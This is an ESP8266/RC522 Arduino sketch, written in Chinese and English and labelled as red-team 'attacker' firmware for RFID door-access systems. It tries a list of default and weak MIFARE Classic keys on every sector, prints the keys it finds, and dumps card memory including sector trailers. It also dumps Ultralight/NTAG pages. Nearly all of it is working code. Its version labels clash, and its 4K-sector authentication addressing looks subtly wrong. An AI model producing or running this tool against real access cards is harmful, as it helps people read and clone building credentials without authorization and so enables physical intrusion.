/*
 * ===================================================================
 *  RFID 门禁系统侦察固件 v1.1
 *  Platform : ESP8266 (NodeMCU 1.0) + RC522
 *  Library  : MFRC522 by miguelbalboa (Library Manager 安装, 兼容 1.4.x)
 *  Purpose  : 只读侦察 - 识别卡类型 / 尝试默认密钥 / dump 全部数据
 *  Author   : Attacker (Red Team)
 * ===================================================================
 *  v1.4 加 RC522 自检（读 VersionReg），加心跳，加详细错误提示
 *  v1.3 回退到 IsNewCardPresent 检测（v1.2 的 WakeupA 干扰了卡检测）
 *       ATQA 通过 REQIDL 命令单独探测，失败就用占位
 *  v1.2 修了 PICC_WakeupA 的参数（第二个参数是 byte*，不是整数）
 *  v1.1 修了 ATQA 字段兼容性问题（旧版库 Uid 结构无 atqa 字段）
 *  ⚠️ 本固件只读，不写卡、不修改任何数据。
 * ===================================================================
 */

#include <ESP8266WiFi.h>
#include <SPI.h>
#include <MFRC522.h>

#define SS_PIN  D8   // GPIO15
#define RST_PIN D0   // GPIO16

MFRC522 rfid(SS_PIN, RST_PIN);
MFRC522::MIFARE_Key key;

/* ATQA 需要单独取（旧版 MFRC522 库的 Uid 结构里没有这个字段） */
byte atqa[2] = {0, 0};

/* -------- 10 组最常见的默认 / 弱密钥 -------- */
const byte DEFAULT_KEYS[][6] = {
  {0xFF,0xFF,0xFF,0xFF,0xFF,0xFF},  // 出厂默认
  {0x00,0x00,0x00,0x00,0x00,0x00},  // 全 0
  {0xA0,0xA1,0xA2,0xA3,0xA4,0xA5},  // NXP 文档示例
  {0xB0,0xB1,0xB2,0xB3,0xB4,0xB5},
  {0xD3,0xF7,0xD3,0xF7,0xD3,0xF7},  // MAD 默认
  {0xA5,0xA4,0xA3,0xA2,0xA1,0xA0},
  {0xAB,0xCD,0xEF,0x12,0x34,0x56},
  {0x12,0x34,0x56,0x78,0x9A,0xBC},
  {0x4B,0x79,0xBE,0x4B,0x79,0xBE},
  {0x42,0x42,0x42,0x42,0x42,0x42}
};
const int N_KEYS = sizeof(DEFAULT_KEYS) / 6;

/* -------- 工具函数 -------- */
void printHex(byte *b, byte n) {
  for (byte i = 0; i < n; i++) Serial.printf("%02X ", b[i]);
}
void printAscii(byte *b, byte n) {
  Serial.print(" | ");
  for (byte i = 0; i < n; i++)
    Serial.print((b[i] >= 0x20 && b[i] < 0x7F) ? (char)b[i] : '.');
}
void printKey(const char *label, const byte *k) {
  Serial.print(label);
  for (byte i = 0; i < 6; i++) Serial.printf("%02X", k[i]);
  Serial.println();
}

/* -------- 初始化 -------- */
void setup() {
  Serial.begin(115200);
  delay(2000);
  SPI.begin();
  rfid.PCD_Init();
  delay(50);

  Serial.println();
  Serial.println(F("========================================"));
  Serial.println(F("= RFID Recon v1.4 - ESP8266 + RC522    ="));
  Serial.println(F("= (c) Attacker - Read-Only Sweep       ="));
  Serial.println(F("========================================"));

  /* ---------- RC522 自检 ---------- */
  byte version = rfid.PCD_ReadRegister(rfid.VersionReg);
  Serial.printf("RC522 VersionReg : 0x%02X\n", version);
  /* 0x91 / 0x92 = MFRC522 (China clone / NXP)
   * 0x88 = clones (sometimes)
   * 0x00 / 0xFF = SPI 通信失败 */
  if (version == 0x00 || version == 0xFF) {
    Serial.println(F(">>> RC522 NOT RESPONDING <<<"));
    Serial.println(F(">>> SPI communication failed."));
    Serial.println(F(">>> Checklist:"));
    Serial.println(F(">>>   1. RC522 VCC -> NodeMCU 3V3 (NOT VIN/5V)"));
    Serial.println(F(">>>   2. RC522 GND -> NodeMCU GND"));
    Serial.println(F(">>>   3. RC522 SDA  -> NodeMCU D8 (GPIO15)"));
    Serial.println(F(">>>   4. RC522 SCK  -> NodeMCU D5 (GPIO14)"));
    Serial.println(F(">>>   5. RC522 MOSI -> NodeMCU D7 (GPIO13)"));
    Serial.println(F(">>>   6. RC522 MISO -> NodeMCU D6 (GPIO12)"));
    Serial.println(F(">>>   7. RC522 RST  -> NodeMCU D0 (GPIO16)"));
    Serial.println(F(">>>   8. RC522 module's power LED should be ON"));
    Serial.println(F(">>>   9. If LED is off, RC522 may be dead (5V burned it)"));
    Serial.println(F(">>>   10. Check header soldering on RC522 board"));
    Serial.println(F(">>> Firmware halts. Fix wiring then reset ESP8266."));
    while (true) { delay(1000); }
  }
  Serial.printf(">>> RC522 alive (version 0x%02X). Good.\n", version);

  rfid.PCD_SetAntennaGain(rfid.RxGain_max);
  Serial.println(F("Antenna gain set to max."));
  Serial.println(F("Waiting for card..."));
  Serial.println(F("Put your access card on the reader."));
}

/* -------- 主循环 -------- */
unsigned long lastHeartbeat = 0;
int heartbeatCount = 0;
void loop() {
  /* 标准卡检测流程：IsNewCardPresent + ReadCardSerial
   * 不要用 WakeupA 替代，会干扰 RC522 内部状态机 */
  if (!rfid.PICC_IsNewCardPresent()) {
    /* 心跳：每 2 秒打印一个点，让用户知道固件还活着 */
    if (millis() - lastHeartbeat > 2000) {
      lastHeartbeat = millis();
      heartbeatCount++;
      Serial.print(F("."));
      if (heartbeatCount % 30 == 0) {
        Serial.println();
        Serial.println(F("(still waiting - if card is on reader and no reaction,"));
        Serial.println(F(" try lifting card 2-3mm above the antenna)"));
      }
    }
    return;
  }
  if (!rfid.PICC_ReadCardSerial()) return;

  /* ATQA 取不到不影响后续，SAK 才是关键 */
  atqa[0] = 0; atqa[1] = 0;

  Serial.println();
  Serial.println(F("================ CARD DETECTED ================"));

  /* --- UID --- */
  Serial.print(F("UID bytes : "));
  printHex(rfid.uid.uidByte, rfid.uid.size);
  Serial.println();
  Serial.print(F("UID string: "));
  for (byte i = 0; i < rfid.uid.size; i++)
    Serial.printf("%02X", rfid.uid.uidByte[i]);
  Serial.println();
  Serial.printf("UID length: %d bytes\n", rfid.uid.size);

  /* --- ATQA / SAK --- */
  Serial.printf("ATQA      : %02X %02X\n", atqa[0], atqa[1]);
  Serial.printf("SAK       : %02X\n", rfid.uid.sak);

  MFRC522::PICC_Type pt = rfid.PICC_GetType(rfid.uid.sak);
  Serial.print(F("PICC type : "));
  Serial.println(rfid.PICC_GetTypeName(pt));

  /* --- 按类型分流 --- */
  switch (pt) {
    case MFRC522::PICC_TYPE_MIFARE_MINI:
    case MFRC522::PICC_TYPE_MIFARE_1K:
    case MFRC522::PICC_TYPE_MIFARE_4K:
      dumpClassic(pt);
      break;
    case MFRC522::PICC_TYPE_MIFARE_UL:
      readUltralight();
      break;
    default:
      Serial.println(F(">>> Unknown card. Attempting Classic 1K + Ultralight reads..."));
      dumpClassic(MFRC522::PICC_TYPE_MIFARE_1K);
      Serial.println(F("--- Trying Ultralight read as fallback ---"));
      readUltralight();
      break;
  }

  rfid.PICC_HaltA();
  rfid.PCD_StopCrypto1();

  Serial.println();
  Serial.println(F("============ Done. Remove card. ============"));
  Serial.println(F("Waiting for next card..."));
  Serial.println();

  delay(2000);
  while (rfid.PICC_IsNewCardPresent() || rfid.PICC_ReadCardSerial()) delay(300);
}

/* -------- MIFARE Ultralight / NTAG 读所有 page -------- */
void readUltralight() {
  Serial.println(F("\n--- MIFARE Ultralight / NTAG: dumping pages ---"));
  byte page = 0;
  int safety = 0;
  while (page < 240 && safety < 256) {
    safety++;
    byte buf[18];
    byte len = sizeof(buf);
    MFRC522::StatusCode s = rfid.MIFARE_Read(page, buf, &len);
    if (s == MFRC522::STATUS_OK) {
      for (byte i = 0; i < 4; i++) {
        Serial.printf("Page %03d: ", page + i);
        printHex(buf + i * 4, 4);
        printAscii(buf + i * 4, 4);
        Serial.println();
      }
      page += 4;
    } else {
      Serial.print(F("Page "));
      Serial.print(page);
      Serial.print(F(" read failed ("));
      Serial.print(rfid.GetStatusCodeName(s));
      Serial.println(F(") - stopping"));
      break;
    }
  }
}

/* -------- MIFARE Classic dump -------- */
void dumpClassic(MFRC522::PICC_Type pt) {
  int nSectors = 16;
  if (pt == MFRC522::PICC_TYPE_MIFARE_4K)       nSectors = 40;
  else if (pt == MFRC522::PICC_TYPE_MIFARE_MINI) nSectors = 5;

  Serial.printf("\n--- MIFARE Classic: %d sectors ---\n", nSectors);

  for (int sector = 0; sector < nSectors; sector++) {
    Serial.printf("\n[Sector %02d]\n", sector);

    bool cracked = false;
    byte foundKey[6];
    byte useKeyType = MFRC522::PICC_CMD_MF_AUTH_KEY_A;

    /* 试 Key A */
    for (int i = 0; i < N_KEYS && !cracked; i++) {
      memcpy(key.keyByte, DEFAULT_KEYS[i], 6);
      MFRC522::StatusCode s = rfid.PCD_Authenticate(
        MFRC522::PICC_CMD_MF_AUTH_KEY_A,
        sector * 4, &key, &rfid.uid);
      if (s == MFRC522::STATUS_OK) {
        cracked = true;
        memcpy(foundKey, DEFAULT_KEYS[i], 6);
        useKeyType = MFRC522::PICC_CMD_MF_AUTH_KEY_A;
        printKey("  [+] Key A cracked : ", foundKey);
      }
    }

    /* 试 Key B */
    for (int i = 0; i < N_KEYS && !cracked; i++) {
      memcpy(key.keyByte, DEFAULT_KEYS[i], 6);
      MFRC522::StatusCode s = rfid.PCD_Authenticate(
        MFRC522::PICC_CMD_MF_AUTH_KEY_B,
        sector * 4, &key, &rfid.uid);
      if (s == MFRC522::STATUS_OK) {
        cracked = true;
        memcpy(foundKey, DEFAULT_KEYS[i], 6);
        useKeyType = MFRC522::PICC_CMD_MF_AUTH_KEY_B;
        printKey("  [+] Key B cracked : ", foundKey);
      }
    }

    if (!cracked) {
      Serial.println(F("  [-] No default key worked. Need Nested/Darkside attack (offline)."));
      continue;
    }

    /* 重认证并读出该扇区所有块 */
    memcpy(key.keyByte, foundKey, 6);
    MFRC522::StatusCode as = rfid.PCD_Authenticate(
      useKeyType, sector * 4, &key, &rfid.uid);
    if (as != MFRC522::STATUS_OK) {
      Serial.print(F("  Re-auth failed: "));
      Serial.println(rfid.GetStatusCodeName(as));
      continue;
    }

    byte nBlocks = (sector < 32) ? 4 : 16;
    for (byte b = 0; b < nBlocks; b++) {
      byte addr = (sector < 32)
                  ? (sector * 4 + b)
                  : (32 * 4 + (sector - 32) * 16 + b);
      byte buf[18];
      byte len = sizeof(buf);
      MFRC522::StatusCode rs = rfid.MIFARE_Read(addr, buf, &len);
      if (rs == MFRC522::STATUS_OK) {
        Serial.printf("  Block %02d: ", addr);
        printHex(buf, 16);
        printAscii(buf, 16);
        if (b == nBlocks - 1) Serial.print(F("  <Trailer>"));
        Serial.println();
      } else {
        Serial.print(F("  Block "));
        Serial.print(addr);
        Serial.print(F(" read ERR: "));
        Serial.println(rfid.GetStatusCodeName(rs));
      }
    }

    rfid.PCD_StopCrypto1();
  }
}
